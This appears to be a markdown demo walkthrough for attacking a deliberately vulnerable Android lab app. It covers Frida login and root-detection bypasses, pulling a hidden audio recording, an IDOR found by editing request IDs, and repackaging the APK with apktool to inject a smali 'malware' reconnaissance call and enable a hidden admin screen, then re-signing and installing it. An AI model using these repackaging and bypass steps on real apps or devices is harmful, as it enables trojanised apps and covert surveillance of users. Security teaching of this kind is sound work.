
## Login & Register bypass
1. Test out that you cant login with empty credentials, missing credentials and a user that already exists.
2. Register new user, try login, get error message.
3. Run bypass-project.js, login again.
	- `frida -U -f com.example.catsadoption_shop -l bypass-project.js`
4. Look in **App Inspection** to find user creds and decode the b64 in cyberchef of the user you made.
5. Showcase that you get SSL pinning failure since youre using the burp suite wifi, disconnect from wifi -> go to 4G -> try again and find it succeeds.

---
## Cat communicator bypass:
**Demonstration and Bypass:**
- **Root Detected:** When run on a standard rooted device (no root-hiding), `isDeviceRooted()` returns `true`. The "Cat Communicator" button is **disabled**, and clicking it displays a "Security violation detected" Toast message.

```bash
adb root
adb push .\frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

- Bypass with frida script: 
```shell
frida -U --codeshare dzonerzy/fridantiroot -f com.example.catsadoption_shop
```

- After 15min, 1min is recorded:
```
adb root
cd /data/data/com.example.catsadoption_shop/cache
ls
```

After you see the audio file, you can pull it using:
`adb pull /data/data/com.example.catsadoption_shop/cache/audio_record_xxx`

---

## Customer Service IDOR
1. Run the uvicorn cmd in the `cats_backend` dir:
```
uvicorn main:app --host 0.0.0.0 --port 8000
```
2. Catch request, send to repeater, change the ID's to find other accounts

---

## Injecting malware:

1. Download an apk from device  
	- Find the path of the package:
```bash
adb shell pm path com.example.catsadoption_shop 
# package:/data/app/~~iEu_4SZ6uMNKleFrXDoJwg==/com.example.catsadoption_shop-XdknwgamjgL1cFxuBLYWKQ==/base.apk
```

2. Pull the apk:
```bash
adb pull /data/app/~~iEu_4SZ6uMNKleFrXDoJwg==/com.example.catsadoption_shop-XdknwgamjgL1cFxuBLYWKQ==/base.apk ./com.example.catadoptionshop.apk  
```

3. Decompile the application & the target application  :
```bash
# Activate apktool env
./.venv/Scripts/Activate

# decompile
apktool.bat d .\com.example.catadoptionshop.apk -o CatAdoptionShop_Tampered
```

4. open \smali_classes5\com\example\catsadoption_shop\MainActivity.smali and and right after the `inovke super` :

5. inject after the found string:
```java
.line 20
sget-object v0, Lcom/zeiniddin/malware/Reconnaissance;->INSTANCE:Lcom/zeiniddin/malware/Reconnaissance; 
    
```

6. place malware files in the correct smali folder (create it):
```
com.example.catadoptionshop\smali_classes5\com\zeiniddin\malware\
Reconnaissance.smali
```

---
## Hidden screen:

Look through the files and find **AppConfig**, change the *false* to *true*
AppConfig file path:
```
\CatAdoptionShop_Tampered\smali_classes5\com\example\catsadoption_shop\AppConfig.smali
```

In this file find the .method, and alter the code to the following:
```
smali
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lcom/example/catsadoption_shop/AppConfig;

    invoke-direct {v0}, Lcom/example/catsadoption_shop/AppConfig;-><init>()V

    sput-object v0, Lcom/example/catsadoption_shop/AppConfig;->INSTANCE:Lcom/example/catsadoption_shop/AppConfig;

    const/4 v0, 0x1
    sput-boolean v0, Lcom/example/catsadoption_shop/AppConfig;->IS_ADMIN_ENABLED:Z

    return-void
.end method
```

You add these 2 lines:
```
const/4 v0, 0x1
sput-boolean v0, Lcom/example/catsadoption_shop/AppConfig;->IS_ADMIN_ENABLED:Z
```

---
## Recompiling and showcasing

7. Align, sign and recompile
```bash
# Build
apktool b CatAdoptionShop_Tampered -o Injected_CatAdoptionShop.apk

# aligns uncompressed data
zipalign -p -f 4 Injected_CatAdoptionShop.apk Aligned_Injected_CatAdoptionShop.apk

# Sign
apksigner sign --ks .\key --v1-signing-enabled true --v2-signing-enabled true .\Aligned_Injected_CatAdoptionShop.apk # "password"
```

8. **Uninstall old apk** and install new one:
```bash
# install , -t
adb install .\Aligned_Injected_CatAdoptionShop.apk
```

9. Look at the logs:
```bash
adb shell 
logcat | grep Z_INJECT_CHECK
```

Results:
```c
emu64xa:/ $ logcat | grep Z_INJECT_CHECK
12-03 16:41:55.103  5490  5490 E Z_INJECT_CHECK: --- INJECTION SUCCESSFUL ---
12-03 16:41:55.103  5490  5490 E Z_INJECT_CHECK: Manufacturer: Google
12-03 16:41:55.105  5490  5490 E Z_INJECT_CHECK: Model: sdk_gphone64_x86_64
12-03 16:41:55.106  5490  5490 E Z_INJECT_CHECK: SDK Version: 36
12-03 16:41:55.106  5490  5490 E Z_INJECT_CHECK: ----------------------------
```


---

